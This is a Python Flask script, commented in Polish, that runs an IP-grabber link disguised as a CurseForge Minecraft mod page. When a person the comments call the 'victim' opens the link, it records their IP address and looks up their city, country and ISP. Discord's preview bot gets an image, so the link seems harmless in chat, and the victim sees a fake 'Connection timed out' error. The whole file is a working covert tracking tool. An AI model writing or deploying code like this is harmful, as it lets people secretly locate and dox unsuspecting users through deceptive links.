from flask import Flask, request, make_response
import requests
import sys

app = Flask(__name__)

# --- KONFIGURACJA ---
# Obrazek błędu dla bota Discorda
ERROR_IMG = "https://i.imgur.com/8YvYv9S.png" 

# Ścieżka nasladująca CurseForge
@app.route('/www.curseforge.com/minecraft/mc-mods/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Obsługa bota Discorda (podgląd obrazka)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        response = make_response("", 302)
        response.headers['Location'] = ERROR_IMG
        response.headers['Content-Type'] = 'image/png'
        return response

    # LOGOWANIE DANYCH (z natychmiastowym wypchnięciem do konsoli)
    print(f"\n[!!!] OFIARA WESZŁA W LINK [!!!]", flush=True)
    print(f"IP: {ip}", flush=True)
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"ISP: {r.get('isp')}", flush=True)
    except: pass
    sys.stdout.flush()

    # Zamiast teleportacji - zostajemy na stronie z błędem
    return '''
    <html>
        <body style="background-color: black; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
            <div style="text-align: center;">
                <p style="font-size: 20px;">Error: Connection timed out.</p>
                <p style="color: #555;">Please refresh the page or try again later.</p>
            </div>
        </body>
    </html>
    ''', 504 # Kod 504 sugeruje błąd połączenia
